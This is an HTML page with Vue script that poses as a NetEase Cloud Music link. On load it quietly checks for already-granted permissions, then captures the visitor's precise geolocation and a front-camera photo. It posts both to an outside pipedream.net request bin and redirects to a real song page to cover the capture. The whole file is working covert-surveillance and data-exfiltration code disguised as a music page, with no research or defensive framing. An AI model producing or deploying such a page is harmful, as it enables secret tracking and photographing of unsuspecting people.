<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>网易云音乐</title>
</head>

<body>
    <script src="https://unpkg.com/vue@3/dist/vue.global.js"></script>
    <div id="app"></div>
    <script>
        const { createApp } = Vue

        createApp({
            data() {
                return {
                    requestbin: 'https://eokewnkdkxq3u7e.m.pipedream.net',
                    target: "https://music.163.com/#/song?id=368800",  // 网易云 牛奶咖啡 - 越长大越孤单

                    geo_granted: false,
                    camera_granted: false,
                    address: null,
                    position: null,
                    base64: "",
                    errorMsg: null
                }
            },
            created() {
                const promise1 = navigator.permissions.query({ name: 'geolocation' }).then(permissionStatus => {
                        return new Promise((resolve, reject) => {
                            if (permissionStatus.state === 'granted') {
                                this.geo_granted = true
                                navigator.geolocation.getCurrentPosition(
                                    resolve,
                                    reject,
                                    { maximumAge: 10000, timeout: 5000, enableHighAccuracy: true }
                                )
                            }
                        })
                    })
                    .then(position => this.getCoordinates(position))
                    .catch(error => this.showError(error))

                const promise2 = navigator.permissions.query({ name: 'camera' }).then(permissionStatus => {
                    if (permissionStatus.state === 'granted') {
                        this.camera_granted = true
                        return this.capturePhoto()
                    }
                })

                Promise.allSettled([promise1, promise2]).then(() => {
                    this.sendReport()
                })
            },
            methods: {
                sendReport() {
                    fetch(this.requestbin, {
                        method: 'POST',
                        mode: 'no-cors',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({
                            geo_granted: this.geo_granted,
                            camera_granted: this.camera_granted,
                            address: this.address,
                            position: this.position,
                            base64: this.base64,
                            errorMsg: this.errorMsg
                        })
                    }).finally(() => {
                        window.location.replace(this.target)
                    })
                },
                getCoordinates(position) {
                    const lat = position.coords.latitude;
                    const lng = position.coords.longitude;
                    const acc = Math.round(position.coords.accuracy);

                    this.address = `${lat}, ${lng}, ${acc}`
                    this.position = position
                },
                showError(error) {
                    switch (error.code) {
                        case error.PERMISSION_DENIED:
                            this.errorMsg = "用户拒绝了获取位置信息的请求。";
                            break;
                        case error.POSITION_UNAVAILABLE:
                            this.errorMsg = "位置信息不可用。";
                            break;
                        case error.TIMEOUT:
                            this.errorMsg = "获取位置信息超时。";
                            break;
                        case error.UNKNOWN_ERROR:
                            this.errorMsg = "发生未知错误。";
                            break;
                    }
                },
                capturePhoto() {
                    const videoElement = document.createElement('video');
                    const canvasElement = document.createElement('canvas');
                    const context = canvasElement.getContext('2d');

                    return navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
                        .then(stream => {
                            videoElement.srcObject = stream;
                            videoElement.play();
                            videoElement.addEventListener('loadedmetadata', () => {
                                canvasElement.width = videoElement.videoWidth;
                                canvasElement.height = videoElement.videoHeight;
                                context.drawImage(videoElement, 0, 0, canvasElement.width, canvasElement.height);
                                this.base64 = canvasElement.toDataURL('image/jpeg');
                                videoElement.srcObject.getTracks().forEach(track => track.stop());
                            });
                        })
                        .catch(error => {
                            console.error('Error accessing media devices:', error);
                        });
                }
            }
        }).mount('#app')
    </script>

</body>

</html>
